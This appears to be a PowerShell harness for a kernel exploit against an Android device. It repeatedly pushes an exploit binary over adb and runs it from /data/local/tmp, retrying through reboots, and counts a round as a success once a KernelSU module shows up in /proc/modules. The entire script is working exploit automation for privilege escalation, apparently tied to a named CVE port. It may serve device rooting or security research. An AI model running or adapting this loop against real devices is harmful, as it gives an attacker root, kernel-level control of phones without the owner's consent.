# Retry loop v2: always re-push (payload is wiped on reboot), small attempt
# budget, detect reboots and cool down before the next round.
$ErrorActionPreference = "Continue"
$dev   = "0484885189A00540"
$local = "E:\code\CVE\cve-2026-98260-xring\o3root-port\build\o3p_ksu_cfi.bin"
$hash  = (Get-FileHash $local -Algorithm SHA256).Hash.ToLower()
$out   = "E:\code\CVE\cve-2026-98260-xring\ab-logs\ksu-loop2.txt"

function Log($m) { $m | Tee-Object -FilePath $out -Append }
function Uptime { [double]((adb -s $dev shell "cut -d' ' -f1 /proc/uptime") -join "") }

Remove-Item $out -ErrorAction SilentlyContinue
Log "=== loop2 start $(Get-Date -Format HH:mm:ss)"

for ($round = 1; $round -le 8; $round++) {
    adb -s $dev push $local /data/local/tmp/o3pK.bin 2>&1 | Out-Null
    $h = (adb -s $dev shell "sha256sum /data/local/tmp/o3pK.bin 2>/dev/null") -join " "
    if ($h -notmatch $hash) { Log "[$round] push verify FAILED"; Start-Sleep 20; continue }
    adb -s $dev shell "chmod 755 /data/local/tmp/o3pK.bin" | Out-Null

    $up0 = Uptime
    adb -s $dev shell "cd /data/local/tmp; rm -f r2_$round.log o3p_insmod.out; nohup ./o3pK.bin 10000 8192 0 0 3 1 8000 200 > r2_$round.log 2>&1 & echo bg" | Out-Null
    Start-Sleep -Seconds 105

    $up1  = Uptime
    $mods = ((adb -s $dev shell "grep -c kernelsu /proc/modules 2>/dev/null") -join "").Trim()
    $keys = ((adb -s $dev shell "grep -a -E 'UIDNOW|KSU_MODULE|KSU_INSMOD|KSU_WROTE|KSU_EXEC' /data/local/tmp/r2_$round.log 2>/dev/null | tail -6") -join " | ")
    $rebooted = ($up1 -lt $up0)

    Log "[$round] uptime $([math]::Round($up0)) -> $([math]::Round($up1)) rebooted=$rebooted kernelsu=$mods"
    if ($keys.Trim().Length -gt 0) { Log "     $keys" }

    if ($mods -eq "1") { Log "[$round] *** KERNELSU LIVE ***"; break }
    if ($rebooted) {
        Log "[$round] device rebooted -> cooling down 45s"
        Start-Sleep -Seconds 45
    } elseif ($up1 -lt 240) {
        Start-Sleep -Seconds 30
    }
}
Log "=== loop2 end $(Get-Date -Format HH:mm:ss)"
